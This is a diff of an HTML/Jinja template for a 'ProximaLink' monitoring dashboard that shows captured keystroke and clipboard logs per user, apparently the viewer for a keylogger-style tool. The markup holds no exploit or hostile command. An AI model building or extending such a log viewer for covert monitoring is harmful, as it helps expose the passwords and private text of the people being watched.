@@ -1,10 +1,9 @@
-<!-- clipboard.html -->
 <!DOCTYPE html>
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Clipboard Logs</title>
+    <title>ProximaLink Dashboard</title>
     <link
       rel="stylesheet"
       href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
@@ -15,31 +14,82 @@
     />
   </head>
   <body>
-    <div class="container">
-      <h1>Clipboard Logs</h1>
-
-      <!-- Display clipboard logs -->
-      {% if clipboard_logs %}
-      <section>
-        <h2>Clipboard Logs</h2>
-        <div class="row row-data">
-          {% for log in clipboard_logs %}
-          <div class="col-md-8 log-entry my-2 p-2 border rounded">
-            <p>{{ log.text }}</p>
-            <p class="timestamp text-left">{{ log.timestamp }}</p>
+    <header class="bg-primary text-white text-center py-3">
+      <h1>ProximaLink Dashboard</h1>
+      <p>Welcome to the monitoring dashboard.</p>
+    </header>
+    <div class="container-fluid">
+      <div class="row">
+        <aside class="col-md-2 bg-light py-3">
+          <h2>Users</h2>
+          <ul class="list-unstyled">
+            {% if unique_users %} {% for user in unique_users %}
+            <li class="user-item">
+              {{ user }}
+              <div class="tags-container mt-2">
+                <span
+                  class="tag"
+                  onclick="filterLogs('{{ user }}', 'KeyStroke')"
+                  >KeyStroke</span
+                >
+                <span
+                  class="tag"
+                  onclick="filterLogs('{{ user }}', 'Clipboard')"
+                  >Clipboard</span
+                >
+              </div>
+            </li>
+            {% endfor %} {% else %}
+            <p>No users found yet.</p>
+            {% endif %}
+          </ul>
+        </aside>
+        <main class="col-md-10 py-3">
+          {% if user_logs %} {% for user, logs in user_logs.items() %}
+          <section class="user-section">
+            <h2>{{ user[0] }}</h2>
+            <p>{{ user[1] }}</p>
+            <div class="row row-data">
+              {% for log in logs %}
+              <div
+                class="col-md-8 log-entry my-2 p-2 border rounded key-stroke"
+              >
+                <p>{{ log.text }}</p>
+                <p class="timestamp text-left">{{ log.timestamp }}</p>
+              </div>
+              {% endfor %}
+            </div>
+            {% if clipboard_logs %}
+            <section class="clipboard-section">
+              <div class="row row-data">
+                {% for log in clipboard_logs %}
+                <div
+                  class="col-md-8 log-entry my-2 p-2 border rounded clipboard"
+                >
+                  <p>{{ log.text }}</p>
+                  <p class="timestamp text-left">{{ log.timestamp }}</p>
+                </div>
+                {% endfor %}
+              </div>
+            </section>
+            {% endif %}
+          </section>
+          {% endfor %} {% endif %}
+          <!-- Alert if no logs found -->
+          {% if not user_logs and not clipboard_logs %}
+          <div class="alert alert-info text-center" role="alert">
+            No logs found yet. Monitor activity for data to appear.
           </div>
-          {% endfor %}
-        </div>
-      </section>
-      {% else %}
-      <div class="alert alert-info text-center" role="alert">
-        No clipboard logs found yet. Monitor activity for data to appear.
+          {% endif %}
+        </main>
       </div>
-      {% endif %}
     </div>
-
+    <footer class="bg-primary text-white text-center py-3 mt-3">
+      <p>ProximaLink Monitoring &copy; 2024</p>
+    </footer>
     <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script src="{{ url_for('static', filename='app.js') }}"></script>
   </body>
 </html>
